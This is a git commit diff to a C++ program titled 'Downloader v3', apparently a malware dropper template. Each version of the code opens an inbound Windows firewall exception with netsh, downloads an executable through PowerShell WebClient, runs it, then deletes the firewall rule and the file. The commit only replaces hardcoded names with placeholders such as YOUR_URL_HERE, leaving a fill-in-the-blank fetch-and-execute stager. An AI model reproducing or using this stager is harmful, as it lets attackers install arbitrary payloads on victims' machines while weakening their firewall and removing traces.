243ba22d4ac13eb5eb69eda94aed3a5cef3465e7
dEEpEst <130660521+LvL23HT@users.noreply.github.com>
2023-04-28 00:18:43 +0200

    Update Downloader v3 by dEEpEst.cpp

--- Downloader v3 by dEEpEst.cpp
+++ Downloader v3 by dEEpEst.cpp
@@ -6,23 +6,23 @@ int main()
 {
     // Create firewall exception
     std::cout << "Create firewall exception\n";
-    system("netsh advfirewall firewall add rule name=\"Downloader v3 by dEEpEst\" dir=in action=allow enable=yes");
+    system("netsh advfirewall firewall add rule name=\"NAME_YOUR_RULE\" dir=in action=allow enable=yes");
     // Download file
     std::cout << "Download file\n";
-    system("powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('https://YOUR_URL_HERE/FUNCIONAL.exe', 'FUNCIONAL.exe')\"");
+    system("powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('https://YOUR_URL_HERE.exe', 'YOUR_FILE.exe')\"");
     // Run file
     std::cout << "Run file\n";
-    system("FUNCIONAL.exe");
+    system("YOUR_FILE.exe");
 
     // Pause console to see the output
     system("pause");
 
     // Remove firewall exception
     std::cout << "Remove firewall exception\n";
-    system("netsh advfirewall firewall delete rule name=\"Downloader v3 by dEEpEst\"");
+    system("netsh advfirewall firewall delete rule name=\"NAME_YOUR_RULE\"");
     // Remove file
     std::cout << "Remove file\n";
-    system("del FUNCIONAL.exe");
+    system("del YOUR_FILE.exe");
     // Exit
     std::cout << "Exit\n";
     system("pause");
